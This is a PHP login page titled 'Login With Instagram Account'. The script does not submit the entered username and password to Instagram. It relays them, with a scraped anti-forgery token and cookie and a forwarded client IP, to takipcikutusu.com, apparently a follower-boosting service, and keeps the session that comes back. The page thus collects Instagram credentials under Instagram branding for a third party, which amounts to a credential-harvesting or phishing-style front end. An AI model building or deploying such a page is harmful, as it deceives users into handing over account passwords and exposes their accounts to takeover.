<?php
session_start();
error_reporting(0);
if (isset($_SERVER['HTTP_CLIENT_IP']))
$ipaddress = $_SERVER['HTTP_CLIENT_IP'];
else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
$ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
else if(isset($_SERVER['HTTP_X_FORWARDED']))
$ipaddress = $_SERVER['HTTP_X_FORWARDED'];
else if(isset($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']))
$ipaddress = $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];
else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
$ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
else if(isset($_SERVER['HTTP_FORWARDED']))
$ipaddress = $_SERVER['HTTP_FORWARDED'];
else if(isset($_SERVER['REMOTE_ADDR']))
$ipaddress = $_SERVER['REMOTE_ADDR'];
else die('use vpn');

if ($_SESSION['login'] == 'true'){
  header('Location: ../Home/');
}




function get_cookies(){
  global $ipaddress;

  $login  = curl_init();
  $headers = array(
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
    "X-Forwarded-For: $ipaddress"
  );
  curl_setopt($login,CURLOPT_URL,"https://takipcikutusu.com/member");
  curl_setopt($login , CURLOPT_FOLLOWLOCATION , true);
  curl_setopt($login , CURLOPT_POST , 0);
  curl_setopt($login,CURLOPT_HEADER,1);
  curl_setopt($login , CURLOPT_RETURNTRANSFER , true);
  curl_setopt($login,CURLOPT_HTTPHEADER,$headers);

  $result = curl_exec($login);
  preg_match_all("/88ae92e37168eafe33e65e5fc815ee79=([^;]+)/i",$result,$e88);
  preg_match_all('/antiForgeryToken=([^"]+)/i',$result,$token);
  


  if ($e88[1][0]){
    $_SESSION['88ae92e37168eafe33e65e5fc815ee79'] = $e88[1][0];
    $_SESSION['token'] = $token[1][0];
  } else {
    die('Try Agein');
  }
}
get_cookies();
if (isset($_POST['username'])){
  $username = $_POST['username'];
  $password = $_POST['password'];
  $v1 = $_SESSION['88ae92e37168eafe33e65e5fc815ee79'];
  $v2 = $_SESSION['token'];
  
  
  $login  = curl_init();
  $headers = array(
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
    "Cookie: 88ae92e37168eafe33e65e5fc815ee79=$v1;",
    "X-Forwarded-For: $ipaddress"
  );
  $data = array(
    "username" => $username,
    "password" => $password,
    "userid" => "",
    "antiForgeryToken" => $v2
  );
  curl_setopt($login,CURLOPT_URL,"https://takipcikutusu.com/member");
  curl_setopt($login , CURLOPT_FOLLOWLOCATION , true);
  curl_setopt($login , CURLOPT_POST , true);
  curl_setopt($login,CURLOPT_HEADER,1);
  curl_setopt($login , CURLOPT_POSTFIELDS , $data);
  curl_setopt($login,CURLOPT_HTTPHEADER,$headers);
  curl_setopt($login , CURLOPT_RETURNTRANSFER , true);

  $result = curl_exec($login);
  if (strpos($result, '{"status":"success"')){
    preg_match_all("/88ae92e37168eafe33e65e5fc815ee79=([^;]+)/i",$result,$end);
    if ($end[1][0]){
      $_SESSION['88ae92e37168eafe33e65e5fc815ee79'] = $end[1][0];
      $_SESSION['login'] = 'true';
      $_SESSION['update'] = 'false';
      $_SESSION['username'] = $username;
      header('Location: ../Home/');
    } else {
      $message = "
      <script>
        Swal.fire({
          icon: 'error',
          title: 'Oops...',
          text: 'Something went wrong!',
        })
      </script>
      ";
    }
  } else {
    $message = "
    <script>
      Swal.fire({
        icon: 'error',
        title: 'Oops...',
        text: 'Error Login .. Please check your login information and try again',
      })
    </script>
    ";

  }
}

?>



<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="all.css">
    <title>Login Page</title>
</head>
<body>

 
<script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
<script nomodule="" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
<script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<script src="sweetalert2.all.min.js"></script>
<?php if ($message) echo $message?>
<div class="wrapper fadeInDown">
  <div id="formContent">
    
    <h2 class="active"> Sign In </h2>
    <div class="isa_info">
    
    <div class="fadeIn first">
      <h1>Login With Instagram Account</h1>
    </div>
    <form action="login.php" method="POST">
      <input type="text" class="fadeIn second" name="username" placeholder="Username" required>
      <input type="password" class="fadeIn third" name="password" placeholder="Password" required>
      <input type="submit" class="fadeIn fourth" value="Login">
 
    </form>
    <div id="formFooter">
      <a class="underlineHover" href="https://www.instagram.com/accounts/password/reset/">Forgot Password?</a>
    </div>

  </div>
</div>
</body>
</html>